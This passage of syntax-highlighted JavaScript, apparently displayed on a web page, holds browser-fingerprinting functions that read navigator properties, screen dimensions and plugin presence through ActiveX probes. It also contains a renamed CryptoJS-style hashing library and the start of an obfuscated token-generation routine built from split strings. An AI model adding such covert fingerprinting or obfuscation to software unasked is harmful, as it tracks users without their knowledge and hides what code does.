class="property">na_appcodename</span> = navigator.<span class="property">appCodeName</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_minor</span> = navigator.<span class="property">appMinorVersion</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_appname</span> = navigator.<span class="property">appName</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_appversion</span> = navigator.<span class="property">appVersion</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_bl</span> = navigator.<span class="property">browserLanguage</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_cookiesEnable</span> = navigator.<span class="property">cookieEnabled</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_cpuclass</span> = navigator.<span class="property">cpuClass</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_online</span> = navigator.<span class="property">onLine</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_platform</span> = navigator.<span class="property">platform</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_syslan</span> = navigator.<span class="property">systemLanguage</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_useragent</span> = navigator.<span class="property">userAgent</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_userlang</span> = navigator.<span class="property">userLanguage</span> || <span class="string">&quot;&quot;</span>),</span><br><span class="line">    r</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">broWidgetIe</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = [], r = <span class="number">0</span>; r &lt; e.<span class="property">length</span>; r++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            widget = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(e[r])</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        t.<span class="title function_">push</span>(e[r])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBroWidgetInfo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = &#123;</span><br><span class="line">        <span class="title class_">ShockwaveFlash</span>: broWidget.<span class="title function_">shockwaveFlash</span>(),</span><br><span class="line">        <span class="title class_">ReadPlayer</span>: broWidget.<span class="title function_">readPlayer</span>(),</span><br><span class="line">        <span class="title class_">AdobeReader</span>: broWidget.<span class="title function_">adobeReader</span>(),</span><br><span class="line">        <span class="title class_">QuickTimePlayer</span>: broWidget.<span class="title function_">quickTimePlayer</span>(),</span><br><span class="line">        <span class="title class_">ShockwavePlayer</span>: broWidget.<span class="title function_">shockwavePlayer</span>(),</span><br><span class="line">        <span class="title class_">WindowsMediaPlayer</span>: broWidget.<span class="title function_">windowsMediaPlayer</span>()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getShockwaveFlash</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;ShockwaveFlash.ShockwaveFlash&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = r.<span class="title class_">GetVariable</span>(<span class="string">&quot;$version&quot;</span>).<span class="title function_">substring</span>(<span class="number">4</span>),</span><br><span class="line">        t = t.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span> + t[<span class="number">1</span>]))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = navigator.<span class="property">plugins</span>[<span class="string">&quot;Shockwave Flash&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getReadPlayer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> r = [<span class="string">&quot;rmocx.RealPlayer G2 Control&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control.1&quot;</span>, <span class="string">&quot;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealVideo.RealVideo(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealPlayer&quot;</span>], n = <span class="literal">null</span>, i = <span class="number">0</span>; i &lt; r.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(r[i])</span><br><span class="line">            &#125; <span class="keyword">catch</span> (o) &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (n)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        n &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = n.<span class="title class_">GetVersionInfo</span>(),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = <span class="keyword">void</span> <span class="number">0</span> == navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span> ? navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span> : navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span>;</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQuickTimePlayer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;QuickTime.QuickTime&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;&#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;QuickTimeCheckObject.QuickTimeCheck&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = r.<span class="property">QuickTimeVersion</span>.<span class="title function_">toString</span>(<span class="number">16</span>),</span><br><span class="line">        t = t.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + <span class="string">&quot;.&quot;</span> + t.<span class="title function_">substring</span>(<span class="number">1</span>, <span class="number">3</span>),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = navigator.<span class="property">plugins</span>[<span class="string">&quot;Adobe QuickTime&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getClientUserAgent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">userAgent</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getScreenXY</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> screen.<span class="property">width</span> + <span class="string">&quot;x &quot;</span> + screen.<span class="property">height</span> + <span class="string">&quot;y&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getOfficeXY</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availWidth</span> + <span class="string">&quot;x &quot;</span> + <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availHeight</span> + <span class="string">&quot;y&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">coloriDepth</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t, r = e;</span><br><span class="line">    <span class="keyword">return</span> t = <span class="string">&quot;Netscape&quot;</span> != r ? screen.<span class="property">colorDepth</span> : screen.<span class="property">pixelDepth</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> coypJsDk = coypJsDk || <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">      , n = r.<span class="property">lib</span> = &#123;&#125;</span><br><span class="line">      , i = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">      , o = n.<span class="property">Base</span> = &#123;</span><br><span class="line">        <span class="attr">extend</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            i.<span class="property"><span class="keyword">prototype</span></span> = <span class="variable language_">this</span>;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> i;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; t.<span class="title function_">mixIn</span>(e),</span><br><span class="line">            t.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;init&quot;</span>) || (t.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                t.<span class="property">$super</span>.<span class="property">init</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            ),</span><br><span class="line">            t.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span> = t,</span><br><span class="line">            t.<span class="property">$super</span> = <span class="variable language_">this</span>,</span><br><span class="line">            t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">create</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="title function_">extend</span>();</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">init</span>.<span class="title function_">apply</span>(e, <span class="variable language_">arguments</span>),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">        <span class="attr">mixIn</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t <span class="keyword">in</span> e)</span><br><span class="line">                e.<span class="title function_">hasOwnProperty</span>(t) &amp;&amp; (<span class="variable language_">this</span>[t] = e[t]);</span><br><span class="line">            e.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;toString&quot;</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">toString</span> = e.<span class="property">toString</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">extend</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , a = n.<span class="property">WordArray</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, r</span>) &#123;</span><br><span class="line">            e = <span class="variable language_">this</span>.<span class="property">words</span> = e || [],</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">sigBytes</span> = r != t ? r : <span class="number">4</span> * e.<span class="property">length</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">toString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (e || c).<span class="title function_">stringify</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">concat</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">              , r = e.<span class="property">words</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">if</span> (e = e.<span class="property">sigBytes</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">clamp</span>(),</span><br><span class="line">            n % <span class="number">4</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; e &gt; i; i++)</span><br><span class="line">                    t[n + i &gt;&gt;&gt; <span class="number">2</span>] |= (r[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (i % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * ((n + i) % <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">65535</span> &lt; r.<span class="property">length</span>)</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; e &gt; i; i += <span class="number">4</span>)</span><br><span class="line">                    t[n + i &gt;&gt;&gt; <span class="number">2</span>] = r[i &gt;&gt;&gt; <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                t.<span class="property">push</span>.<span class="title function_">apply</span>(t, r);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">sigBytes</span> += e,</span><br><span class="line">            <span class="variable language_">this</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clamp</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">              , r = <span class="variable language_">this</span>.<span class="property">sigBytes</span>;</span><br><span class="line">            t[r &gt;&gt;&gt; <span class="number">2</span>] &amp;= <span class="number">4294967295</span> &lt;&lt; <span class="number">32</span> - <span class="number">8</span> * (r % <span class="number">4</span>),</span><br><span class="line">            t.<span class="property">length</span> = e.<span class="title function_">ceil</span>(r / <span class="number">4</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">words</span> = <span class="variable language_">this</span>.<span class="property">words</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">random</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; t &gt; n; n += <span class="number">4</span>)</span><br><span class="line">                r.<span class="title function_">push</span>(<span class="number">4294967296</span> * e.<span class="title function_">random</span>() | <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , s = r.<span class="property">enc</span> = &#123;&#125;</span><br><span class="line">      , c = s.<span class="property">Hex</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            e = e.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; e &gt; n; n++) &#123;</span><br><span class="line">                <span class="keyword">var</span> i = t[n &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>) &amp; <span class="number">255</span>;</span><br><span class="line">                r.<span class="title function_">push</span>((i &gt;&gt;&gt; <span class="number">4</span>).<span class="title function_">toString</span>(<span class="number">16</span>)),</span><br><span class="line">                r.<span class="title function_">push</span>((<span class="number">15</span> &amp; i).<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">length</span>, r = [], n = <span class="number">0</span>; t &gt; n; n += <span class="number">2</span>)</span><br><span class="line">                r[n &gt;&gt;&gt; <span class="number">3</span>] |= <span class="built_in">parseInt</span>(e.<span class="title function_">substr</span>(n, <span class="number">2</span>), <span class="number">16</span>) &lt;&lt; <span class="number">24</span> - <span class="number">4</span> * (n % <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t / <span class="number">2</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , l = s.<span class="property">Latin1</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            e = e.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; e &gt; n; n++)</span><br><span class="line">                r.<span class="title function_">push</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(t[n &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>) &amp; <span class="number">255</span>));</span><br><span class="line">            <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">length</span>, r = [], n = <span class="number">0</span>; t &gt; n; n++)</span><br><span class="line">                r[n &gt;&gt;&gt; <span class="number">2</span>] |= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(n)) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , h = s.<span class="property">Utf8</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">escape</span>(l.<span class="title function_">stringify</span>(e)))</span><br><span class="line">            &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="title class_">Error</span>(<span class="string">&quot;Malformed UTF-8 data&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l.<span class="title function_">parse</span>(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(e)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , u = n.<span class="property">BufferedBlockAlgorithm</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_data</span> = <span class="keyword">new</span> a.<span class="property">init</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> = <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_append</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; (e = h.<span class="title function_">parse</span>(e)),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">concat</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> += e.<span class="property">sigBytes</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_process</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">              , n = r.<span class="property">words</span></span><br><span class="line">              , i = r.<span class="property">sigBytes</span></span><br><span class="line">              , o = <span class="variable language_">this</span>.<span class="property">blockSize</span></span><br><span class="line">              , s = i / (<span class="number">4</span> * o)</span><br><span class="line">              , s = t ? e.<span class="title function_">ceil</span>(s) : e.<span class="title function_">max</span>((<span class="number">0</span> | s) - <span class="variable language_">this</span>.<span class="property">_minBufferSize</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (t = s * o,</span><br><span class="line">            i = e.<span class="title function_">min</span>(<span class="number">4</span> * t, i),</span><br><span class="line">            t) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; t &gt; c; c += o)</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">_doProcessBlock</span>(n, c);</span><br><span class="line">                c = n.<span class="title function_">splice</span>(<span class="number">0</span>, t),</span><br><span class="line">                r.<span class="property">sigBytes</span> -= i</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(c,i)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">_data</span> = <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">clone</span>(),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_minBufferSize</span>: <span class="number">0</span></span><br><span class="line">    &#125;);</span><br><span class="line">    n.<span class="property">Hasher</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: o.<span class="title function_">extend</span>(),</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            u.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doReset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">update</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">            <span class="variable language_">this</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">finalize</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doFinalize</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="attr">_createHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">t, r</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> e.<span class="title function_">init</span>(r).<span class="title function_">finalize</span>(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_createHmacHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">t, r</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> p.<span class="property">HMAC</span>.<span class="title function_">init</span>(e,r).<span class="title function_">finalize</span>(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> p = r.<span class="property">algo</span> = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;(<span class="title class_">Math</span>)</span><br><span class="line">  , process = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = -<span class="number">979402</span></span><br><span class="line">      , r = <span class="number">979402</span>;</span><br><span class="line">    _nuz = -<span class="number">705100</span>,</span><br><span class="line">    _nux = <span class="number">705102</span>,</span><br><span class="line">    _mlq = <span class="number">1</span>,</span><br><span class="line">    _zmmn = -<span class="number">1</span>,</span><br><span class="line">    _xhce = <span class="number">664917</span>,</span><br><span class="line">    _pvaa = -<span class="number">713216</span>,</span><br><span class="line">    _tmlq = <span class="number">713456</span>,</span><br><span class="line">    _bbm = <span class="number">933985</span>,</span><br><span class="line">    _lxz = <span class="number">33853</span>,</span><br><span class="line">    _sbx = -<span class="number">93056</span>,</span><br><span class="line">    _nnuy = <span class="string">&quot;lit&quot;</span>,</span><br><span class="line">    _uuz = <span class="string">&quot;map&quot;</span>,</span><br><span class="line">    _jggu = <span class="string">&quot;it&quot;</span>,</span><br><span class="line">    _yyf = <span class="string">&quot;function&quot;</span>,</span><br><span class="line">    _oos = <span class="string">&quot;_&quot;</span>,</span><br><span class="line">    _hsvuz = <span class="string">&quot;sub&quot;</span>,</span><br><span class="line">    _isus = <span class="string">&quot;cha&quot;</span>,</span><br><span class="line">    _paww = <span class="string">&quot;str&quot;</span>,</span><br><span class="line">    _lyydw = <span class="string">&quot;sp&quot;</span>,</span><br><span class="line">    _qndkq = <span class="string">&quot;cha&quot;</span>,</span><br><span class="line">    _muzz = <span class="string">&quot;spl&quot;</span>,</span><br><span class="line">    _unny = <span class="string">&quot;base&quot;</span>,</span><br><span class="line">    _heeqc = <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">var</span> n = &#123;</span><br><span class="line">        <span class="attr">_base</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">_baseTable</span>: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">        <span class="attr">_baseTables</span>: [-<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span 